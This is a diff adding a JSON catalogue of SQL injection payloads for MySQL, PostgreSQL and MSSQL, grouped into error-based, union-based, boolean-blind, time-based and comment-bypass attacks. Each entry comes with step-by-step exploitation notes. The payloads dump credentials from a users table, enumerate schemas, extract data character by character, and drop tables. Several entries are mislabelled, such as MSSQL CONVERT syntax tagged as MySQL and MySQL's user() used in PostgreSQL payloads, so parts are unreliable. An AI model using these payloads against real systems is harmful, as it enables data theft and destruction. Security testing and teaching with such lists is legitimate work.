@@ -1,0 +1,204 @@
+{
+  "error_based": [
+    {
+      "payload": "1' AND 1=CONVERT(int, (SELECT @@version))--",
+      "type": "error_based",
+      "database": "MySQL",
+      "description": "Extract MySQL version through CONVERT function error",
+      "difficulty": "Easy",
+      "exploitation_method": "Triggers CONVERT error, returns database version in error message"
+    },
+    {
+      "payload": "1' AND extractvalue(rand(), concat(0x3a, (SELECT user())))--",
+      "type": "error_based",
+      "database": "MySQL",
+      "description": "Extract current database user using extractvalue() function",
+      "difficulty": "Medium",
+      "exploitation_method": "extractvalue() function error displays current_user() result"
+    },
+    {
+      "payload": "1' AND updatexml(1, concat(0x3a, (SELECT database())), 1)--",
+      "type": "error_based",
+      "database": "MySQL",
+      "description": "Extract database name using updatexml() function",
+      "difficulty": "Medium",
+      "exploitation_method": "updatexml() throws error containing database name"
+    },
+    {
+      "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
+      "type": "error_based",
+      "database": "MySQL",
+      "description": "Extract table names from information_schema",
+      "difficulty": "Hard",
+      "exploitation_method": "Duplicate key error displays table names"
+    },
+    {
+      "payload": "1' AND ST_LatFromGeoHash((SELECT CONCAT(user, ':', password) FROM users LIMIT 1))--",
+      "type": "error_based",
+      "database": "MySQL",
+      "description": "Extract user credentials using GeoHash function error",
+      "difficulty": "Hard",
+      "exploitation_method": "ST_LatFromGeoHash error returns data in error message"
+    }
+  ],
+  "union_based": [
+    {
+      "payload": "1' UNION SELECT NULL, user(), version(), database()--",
+      "type": "union_based",
+      "database": "MySQL",
+      "description": "Extract basic database information via UNION",
+      "difficulty": "Easy",
+      "exploitation_method": "UNION query combines attacker query with legitimate query results"
+    },
+    {
+      "payload": "1' UNION SELECT table_name, column_name, NULL, NULL FROM information_schema.columns WHERE table_schema=database()--",
+      "type": "union_based",
+      "database": "MySQL",
+      "description": "Extract all tables and columns from current database",
+      "difficulty": "Medium",
+      "exploitation_method": "UNION combines information_schema query with output"
+    },
+    {
+      "payload": "1' UNION SELECT GROUP_CONCAT(table_name), GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_schema=database()--",
+      "type": "union_based",
+      "database": "MySQL",
+      "description": "Extract and concatenate all tables and columns",
+      "difficulty": "Medium",
+      "exploitation_method": "GROUP_CONCAT aggregates multiple rows into single output"
+    },
+    {
+      "payload": "1' UNION SELECT column_name, data_type, column_key, NULL FROM information_schema.columns WHERE table_name='users'--",
+      "type": "union_based",
+      "database": "MySQL",
+      "description": "Extract schema of 'users' table",
+      "difficulty": "Medium",
+      "exploitation_method": "UNION displays column names, types, and key information"
+    },
+    {
+      "payload": "1' UNION SELECT username, password, email, NULL FROM users WHERE 1=1--",
+      "type": "union_based",
+      "database": "MySQL",
+      "description": "Extract user credentials directly",
+      "difficulty": "Easy",
+      "exploitation_method": "UNION retrieves username, password, email from users table"
+    }
+  ],
+  "boolean_blind": [
+    {
+      "payload": "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
+      "type": "boolean_blind",
+      "database": "MySQL",
+      "description": "Boolean blind: Verify database accessibility",
+      "difficulty": "Hard",
+      "exploitation_method": "\n            EXPLOITATION METHOD (Description Only):\n            1. Send payload with AND condition\n            2. If page content differs when condition is TRUE vs FALSE\n            3. Attacker deduces database state without direct output\n            4. Character-by-character database extraction possible\n            \n            Example progression:\n            - 'AND 1=1' \u2192 TRUE condition (normal response)\n            - 'AND 1=2' \u2192 FALSE condition (different response)\n            - 'AND (SELECT SUBSTRING(database(),1,1)) > 'a'' \u2192 Binary search\n            - Iterate: a-m < results in different response (e.g., 'm')\n            - 'AND (SELECT SUBSTRING(database(),1,1)) > 'm'' \u2192 Continue narrowing\n            \n            This allows character-by-character extraction of sensitive data\n            "
+    },
+    {
+      "payload": "1' AND (SELECT LENGTH(user())) > 5--",
+      "type": "boolean_blind",
+      "database": "MySQL",
+      "description": "Boolean blind: Extract username length",
+      "difficulty": "Hard",
+      "exploitation_method": "\n            EXPLOITATION METHOD (Description Only):\n            1. Use LENGTH() function to determine data size\n            2. Binary search: 'LENGTH(user()) > 5' vs 'LENGTH(user()) > 10'\n            3. Narrow down exact length through boolean responses\n            4. Once length is known (e.g., 7 characters):\n               - Extract character by character: SUBSTRING(user(), 1, 1)\n               - Compare against ASCII ranges: SUBSTRING(user(), 1, 1) > 64\n               - Continues until exact character identified\n            \n            Example: If username is 'admin22'\n            - 'LENGTH(user()) = 7' returns TRUE\n            - 'SUBSTRING(user(), 1, 1) > 'a'' returns TRUE\n            - 'SUBSTRING(user(), 1, 1) > 'm'' returns FALSE\n            - Character is between 'a' and 'm' \u2192 'admin'\n            "
+    },
+    {
+      "payload": "1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0--",
+      "type": "boolean_blind",
+      "database": "PostgreSQL",
+      "description": "Boolean blind: Check username patterns",
+      "difficulty": "Very Hard",
+      "exploitation_method": "\n            EXPLOITATION METHOD (Description Only):\n            1. Use LIKE operator with wildcard patterns\n            2. Enumerate usernames: 'admin%', 'user%', 'test%'\n            3. For known pattern 'admin%':\n               - Narrow down: 'admin_' then 'admin__' etc.\n            4. Combine with SUBSTRING for specific position extraction:\n               - 'WHERE username LIKE 'admin%''\n            5. Boolean response indicates pattern match\n            \n            This allows database enumeration without error messages\n            "
+    },
+    {
+      "payload": "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 100 THEN 1 ELSE 0 END) = 1--",
+      "type": "boolean_blind",
+      "database": "MSSQL",
+      "description": "Boolean blind: Table record counting",
+      "difficulty": "Hard",
+      "exploitation_method": "\n            EXPLOITATION METHOD (Description Only):\n            1. Use CASE WHEN for conditional boolean results\n            2. Count table records: 'COUNT(*) > 100'\n            3. Binary search on count:\n               - 'COUNT(*) > 50' \u2192 TRUE or FALSE\n               - 'COUNT(*) > 75' \u2192 TRUE or FALSE\n               - Narrow range until exact count found\n            4. Useful for:\n               - Determining database size\n               - Verifying data existence\n               - Estimating table importance\n            "
+    }
+  ],
+  "time_based": [
+    {
+      "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+      "type": "time_based",
+      "database": "MySQL",
+      "description": "Time-based blind: Sleep function delay",
+      "difficulty": "Hard",
+      "exploitation_method": "\n            EXPLOITATION METHOD (Description Only):\n            1. Inject SLEEP() function for time-based detection\n            2. Payload execution causes X-second delay\n            3. Attacker measures response time:\n               - Normal response: ~0.5s\n               - With SLEEP(5): ~5.5s \u2192 Confirms injection\n            \n            Exploitation flow:\n            - 'SLEEP(5) IF condition_true ELSE 0'\n            - Condition TRUE \u2192 5 second delay (confirms injection)\n            - Condition FALSE \u2192 normal response time\n            \n            Character extraction:\n            - 'SUBSTRING(user(),1,1)='a' SLEEP(5)'\n            - If delay occurs \u2192 first character is 'a'\n            - If no delay \u2192 try next character\n            \n            This bypasses output completely, uses timing as data channel\n            "
+    },
+    {
+      "payload": "1' AND IF((SELECT COUNT(*) FROM users) > 10, SLEEP(5), 0)--",
+      "type": "time_based",
+      "database": "MySQL",
+      "description": "Time-based blind: Conditional sleep based on count",
+      "difficulty": "Hard",
+      "exploitation_method": "\n            EXPLOITATION METHOD (Description Only):\n            1. Use IF() for conditional timing:\n               - IF(condition, SLEEP(5), 0)\n            2. Condition evaluation determines delay\n            \n            Example: User enumeration\n            - 'IF(COUNT(user) > 100, SLEEP(5), 0)'\n            - 5 second delay \u2192 more than 100 users\n            - No delay \u2192 100 or fewer users\n            \n            Exact count finding (binary search):\n            - 'IF(COUNT(*) > 50, SLEEP(5), 0)'\n            - 'IF(COUNT(*) > 75, SLEEP(5), 0)'\n            - 'IF(COUNT(*) > 87, SLEEP(5), 0)'\n            - Continue until exact count identified\n            "
+    },
+    {
+      "payload": "1' OR 1=1; WAITFOR DELAY '00:00:05'--",
+      "type": "time_based",
+      "database": "MSSQL",
+      "description": "Time-based blind: MSSQL WAITFOR command",
+      "difficulty": "Very Hard",
+      "exploitation_method": "\n            EXPLOITATION METHOD (Description Only):\n            1. MSSQL uses WAITFOR command instead of SLEEP\n            2. Syntax: WAITFOR DELAY 'hh:mm:ss'\n            \n            Exploitation:\n            - 'WAITFOR DELAY '00:00:05'' \u2192 5 second delay\n            - Combined with stacked queries: '; WAITFOR...'\n            - Requires semicolon for query separation\n            \n            Conditional timing:\n            - 'IF (SELECT COUNT(*) FROM users) > 100'\n            - 'WAITFOR DELAY '00:00:05''\n            \n            Data extraction:\n            - Enumerate character by character\n            - Use SUBSTRING and ASCII comparisons\n            - Time delay indicates character match\n            "
+    },
+    {
+      "payload": "1' AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+      "type": "time_based",
+      "database": "PostgreSQL",
+      "description": "Time-based blind: PostgreSQL pg_sleep function",
+      "difficulty": "Very Hard",
+      "exploitation_method": "\n            EXPLOITATION METHOD (Description Only):\n            1. PostgreSQL uses pg_sleep(seconds) function\n            2. Can be combined with CASE WHEN for conditionals\n            \n            Character extraction process:\n            - 'SUBSTRING(user(),1,1)='a'' \u2192 if TRUE, 5 second delay\n            - Try 'a' through 'z' until delay occurs\n            - Found character \u2192 move to position 2\n            - 'SUBSTRING(user(),2,1)='d'' \u2192 test next position\n            \n            Data extraction:\n            - Similar to SLEEP-based, different function name\n            - Allows full database enumeration\n            - Very reliable but slow (5+ seconds per character)\n            \n            Optimization:\n            - Use binary search on ASCII values\n            - '(ASCII(SUBSTRING(user(),1,1))>96)' \u2192 faster\n            "
+    }
+  ],
+  "comment_bypass": [
+    {
+      "payload": "1' OR '1'='1",
+      "type": "comment_bypass",
+      "database": "MySQL",
+      "description": "Basic quote bypass without comments",
+      "difficulty": "Easy",
+      "exploitation_method": "\n            Original query: SELECT * FROM users WHERE id='$input'\n            Injected: 1' OR '1'='1\n            Result: SELECT * FROM users WHERE id='1' OR '1'='1'\n            \n            The OR condition is always TRUE, returns all users\n            Doesn't require comment removal, quote mismatch handled naturally\n            "
+    },
+    {
+      "payload": "1' UNION SELECT NULL#",
+      "type": "comment_bypass",
+      "database": "MySQL",
+      "description": "Hash comment (#) bypass in MySQL",
+      "difficulty": "Easy",
+      "exploitation_method": "\n            MySQL Comment types:\n            1. '--' (double dash with space): Ignores rest of line\n            2. '#' (hash): Ignores rest of line (web URL compatible)\n            3. '/*' ... '*/' (block comment): Multi-line comments\n            \n            Original: SELECT * FROM users WHERE id='$id'\n            Injected: 1' UNION SELECT version(), user()--\n            Result: SELECT * FROM users WHERE id='1' UNION SELECT version(), user()--'\n            \n            Everything after '--' is ignored, including closing quote\n            Allows arbitrary query injection\n            "
+    },
+    {
+      "payload": "1' UNION SELECT NULL,NULL/*",
+      "type": "comment_bypass",
+      "database": "MySQL",
+      "description": "Block comment bypass (/*...*/)",
+      "difficulty": "Easy",
+      "exploitation_method": "\n            Block comments: /* ... */ span multiple lines\n            \n            Original: SELECT id, name FROM users WHERE id='$input' LIMIT 5\n            Injected: 1' UNION SELECT user(), version()/*\n            Result: SELECT id, name FROM users WHERE id='1' UNION SELECT user(), version()/* LIMIT 5'\n            \n            Everything after /* is commented, closing */ not needed at line end\n            Useful when:\n            - Output must match column count\n            - WHERE conditions exist after injection point\n            - LIMIT clauses need bypassing\n            "
+    },
+    {
+      "payload": "1'; DROP TABLE users; --",
+      "type": "comment_bypass",
+      "database": "MySQL",
+      "description": "Stacked query comment bypass",
+      "difficulty": "Medium",
+      "exploitation_method": "\n            Stacked queries (;) allow multiple statements\n            \n            Original: SELECT * FROM users WHERE id='$input'\n            Injected: 1'; DROP TABLE users;--\n            Result: SELECT * FROM users WHERE id='1'; DROP TABLE users;--'\n            \n            Executed as:\n            1. SELECT * FROM users WHERE id='1'\n            2. DROP TABLE users\n            3. (Third statement commented out)\n            \n            Requires:\n            - Multiple query support (mysqli, PDO, ODBC)\n            - Database permissions to execute DDL\n            - --' comments out remaining original query\n            "
+    },
+    {
+      "payload": "1' AND '1'='1' --",
+      "type": "comment_bypass",
+      "database": "PostgreSQL",
+      "description": "PostgreSQL double-dash comment bypass",
+      "difficulty": "Easy",
+      "exploitation_method": "\n            PostgreSQL comment syntax:\n            - '--' (double dash): Line comment (must have space after --)\n            - '/*' ... '*/' : Block comment\n            \n            Original: SELECT * FROM users WHERE id='$id'\n            Injected: 1' AND '1'='1' --\n            Result: SELECT * FROM users WHERE id='1' AND '1'='1' --'\n            \n            Closing ' and rest of query become comment\n            Condition is always TRUE, returns entire table\n            "
+    },
+    {
+      "payload": "1' OR '1'='1' /*",
+      "type": "comment_bypass",
+      "database": "MSSQL",
+      "description": "MSSQL comment bypass",
+      "difficulty": "Easy",
+      "exploitation_method": "\n            MSSQL comment syntax:\n            - '--' (double dash): Line comment\n            - '/* ... */' : Block comment\n            \n            Original: SELECT * FROM users WHERE id='$id'\n            Injected: 1' OR '1'='1' /*\n            Result: SELECT * FROM users WHERE id='1' OR '1'='1' /*'\n            \n            Block comment opened but not closed - everything after becomes comment\n            Closing quote and rest of original query ignored\n            "
+    }
+  ]
+}
